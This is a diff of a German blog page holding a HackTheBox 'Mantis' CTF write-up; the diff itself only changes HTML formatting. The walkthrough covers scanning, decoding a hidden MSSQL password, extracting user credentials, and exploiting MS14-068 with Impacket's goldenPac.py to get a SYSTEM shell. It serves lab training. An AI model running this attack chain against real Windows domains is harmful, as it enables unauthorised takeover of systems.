@@ -46,8 +46,8 @@ Tipps  Port 8080 ist nicht der richtige HTTP Port. Außerdem sollte eine größe
 <meta itemprop="name" content="HackTheBox - Mantis WriteUp | Tipps &#43; Anleitung">
 <meta itemprop="description" content="Mantis ist eine der schwierigeren CTF Challenges von HackTheBox. Allerdings ist die Mantis relativ einfach, wenn man weiß, was man macht.
 
-Tipps  Port 8080 ist nicht der richtige HTTP Port. Außerdem sollte eine größere Wörterliste für das Directory Bruteforcing benutzt werden. Um an User und Root zu kommen, musst du einen Exploit für die kritische Kerberos Schwachstelle MS14-068 benutzen. GoldenPac.py von Impacket, kann es dir einfacher machen.  Video"><meta itemprop="datePublished" content="2018-02-26T15:28:56&#43;01:00" />
-<meta itemprop="dateModified" content="2018-02-26T15:28:56&#43;01:00" />
+Tipps  Port 8080 ist nicht der richtige HTTP Port. Außerdem sollte eine größere Wörterliste für das Directory Bruteforcing benutzt werden. Um an User und Root zu kommen, musst du einen Exploit für die kritische Kerberos Schwachstelle MS14-068 benutzen. GoldenPac.py von Impacket, kann es dir einfacher machen.  Video"><meta itemprop="datePublished" content="2018-02-26T15:28:56+01:00" />
+<meta itemprop="dateModified" content="2018-02-26T15:28:56+01:00" />
 <meta itemprop="wordCount" content="1229"><meta itemprop="image" content="/"/>
 <meta itemprop="keywords" content="hackthebox,ctf,german," />
 <meta name="twitter:card" content="summary_large_image"/>
@@ -67,8 +67,8 @@ Tipps  Port 8080 ist nicht der richtige HTTP Port. Außerdem sollte eine größe
 Tipps  Port 8080 ist nicht der richtige HTTP Port. Außerdem sollte eine größere Wörterliste für das Directory Bruteforcing benutzt werden. Um an User und Root zu kommen, musst du einen Exploit für die kritische Kerberos Schwachstelle MS14-068 benutzen. GoldenPac.py von Impacket, kann es dir einfacher machen.  Video" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="/posts/2018/02/hackthebox-mantis-writeup-tipps-anleitung/" /><meta property="og:image" content="/"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2018-02-26T15:28:56&#43;01:00" />
-<meta property="article:modified_time" content="2018-02-26T15:28:56&#43;01:00" />
+<meta property="article:published_time" content="2018-02-26T15:28:56+01:00" />
+<meta property="article:modified_time" content="2018-02-26T15:28:56+01:00" />
 
 
 
@@ -166,7 +166,7 @@ Tipps  Port 8080 ist nicht der richtige HTTP Port. Außerdem sollte eine größe
 <p><a href="http://www.youtube.com/watch?v=mTuHL0SHDVY"><img src="http://img.youtube.com/vi/mTuHL0SHDVY/0.jpg" alt="Kurzes Video Walkthrough ohne Erklärungen"></a></p>
 <h2 id="anleitung"><strong>Anleitung</strong></h2>
 <p>Als erstes machen wir wie immer einen Nmap-Scan. Wir scannen alle Ports mit <strong>-p-</strong> und lassen uns mit <strong>-A</strong> Informationen zum einen zu den jeweiligen Services anzeigen und zum anderen ein paar Skripte laufen.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# nmap -A -p- 10.10.10.52
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# nmap -A -p- 10.10.10.52
 
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 PORT      STATE SERVICE       VERSION
@@ -260,7 +260,7 @@ Host script results:
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 </code></pre></div><p>Bei Port <strong>1337</strong> läuft ein HTTP-Server. Das Skript <strong>smb-os-discovery</strong> findet heraus, dass das Betriebssystem <strong>Windows Server 2008 R2 Service Pack 1</strong>, der Computer-Name <strong>mantis</strong> und der Domain-Name <strong>htb.local</strong> ist. Diese Informationen werden uns später noch nützlich sein. Außerdem läuft auf Port <strong>1433</strong> ein <strong>Microsoft SQL Server</strong>.</p>
 <p>Als nächstes sehen wir nach, welche Verzeichnisse wir finden können.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# gobuster -u 10.10.10.52:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">25</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# gobuster -u 10.10.10.52:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">25</span>
 
 Gobuster v1.2 OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span>
 <span style="color:#f92672">=====================================================</span>
@@ -276,7 +276,7 @@ Gobuster v1.2 OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span st
 <p>Sehen wir uns <strong>secure_notes</strong> mal an.</p>
 <p><a href="https://imgur.com/Dcz52w6"><img src="https://imgur.com/Dcz52w6.jpg" alt="secure notes"></a></p>
 <p>Wir sehen zwei Dateien. <strong>web.config</strong> ist uninteressant, aber **dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt **hat einige interessante Informationen für uns. Der Inhalt der Datei ist wie folgt:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">1. Download OrchardCMS
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">1. Download OrchardCMS
 2. Download SQL server <span style="color:#ae81ff">2014</span> Express ,create user <span style="color:#e6db74">&#34;admin&#34;</span>,and create orcharddb database
 3. Launch IIS and add new website and point to Orchard CMS folder location.
 4. Launch browser and navigate to http://localhost:8080
@@ -284,14 +284,14 @@ Gobuster v1.2 OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span st
 6. Add blog pages with admin user.
 </code></pre></div><p>Es wird also wahrscheinlich ein <strong>SQL server 2014 Express</strong> benutzt, welcher eine Datenbank namens <strong>orcharddb</strong> mit dem Benutzer <strong>admin</strong> hat.</p>
 <p>Die Text-Datei hat einen merkwürdigen Namen, der nach einer Base64 Kodierung aussieht.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d
 6d2424716c5f53405f504073735730726421
 </code></pre></div><p>Der String den wir nach der Dekodierung erhalten, sieht nach Hexadezimal aus, da nur Buchstaben bis F und Zahlen vorkommen.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# echo 6d2424716c5f53405f504073735730726421 | xxd -r -p
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# echo 6d2424716c5f53405f504073735730726421 | xxd -r -p
 m$ql_S@_P@ssW0rd!
 </code></pre></div><p>Wir haben anscheinen ein Passwort erhalten.</p>
 <p>Versuchen wir uns mal mit dem Benutzernamen <strong>admin</strong> und dem Passwort <strong>m$$ql_S@_P@ssW0rd!</strong> bei der SQL-Datenbank anzumelden. Ich benutze dafür DBeaver.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# dbeaver
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# dbeaver
 </code></pre></div><p>Als erstes wählen wir <strong>MS SQL Server</strong> aus.</p>
 <p><a href="https://imgur.com/hJQ4dcp"><img src="https://imgur.com/hJQ4dcp.jpg" alt="ms sql"></a></p>
 <p>Dann müssen noch die erforderlichen Daten eingeben. Dank unseres Nmap-Scans wissen wir, dass der Standard-Port 1433 benutzt wird.</p>
@@ -303,7 +303,7 @@ m$ql_S@_P@ssW0rd!
 <p>Beim Benutzer <strong>James</strong> ist es allerdings gewollt, dass sein Passwort nicht verschlüsselt ist. Merken wir uns also sein Passwort <strong>J@m3s_P@ssW0rd!</strong></p>
 <p><a href="https://imgur.com/COpkwm4"><img src="https://imgur.com/COpkwm4.jpg" alt="credentials"></a></p>
 <p>Für den nächsten Schritt müssen wir unsere <strong>/etc/hosts</strong> Datei bearbeiten, welche dafür benutzt wird um Rechnernamen in IP-Adressen aufzulösen.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~/impacket# vi /etc/hosts
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~/impacket# vi /etc/hosts
 
 127.0.0.1 localhost
 127.0.1.1 kali
@@ -314,7 +314,7 @@ m$ql_S@_P@ssW0rd!
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 </code></pre></div><p>Als nächstes können wir das Python Skript <strong>goldenPac.py</strong> von der Python Klassen Sammlung <a href="https://github.com/CoreSecurity/impacket">Impacket</a> benutzen, um die kritische Kerberos Schwachstelle <a href="https://docs.microsoft.com/de-de/security-updates/SecurityBulletins/2014/ms14-068">MS14-068</a> auszunutzen.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~/impacket# goldenPac.py htb.local/james:J@m3s_P@ssW0rd<span style="color:#ae81ff">\!</span>@mantis.htb.local
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~/impacket# goldenPac.py htb.local/james:J@m3s_P@ssW0rd<span style="color:#ae81ff">\!</span>@mantis.htb.local
 Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies
 
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
@@ -334,7 +334,7 @@ Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</sp
 C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
 nt authority<span style="color:#ae81ff">\s</span>ystem
 </code></pre></div><p>Jetzt können wir uns die User und die Root Flag abholen.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;cd C:/users
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;cd C:/users
 
 C:<span style="color:#ae81ff">\U</span>sers&gt;dir
 Volume in drive C has no label.
@@ -370,7 +370,7 @@ Directory of C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81
 
 C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\j</span>ames<span style="color:#ae81ff">\D</span>esktop&gt;more user.txt
 8a8#########ZENSIERT#########54d
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\j</span>ames<span style="color:#ae81ff">\D</span>esktop&gt;cd ..
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\j</span>ames<span style="color:#ae81ff">\D</span>esktop&gt;cd ..
 
 C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\j</span>ames&gt;cd ..
 
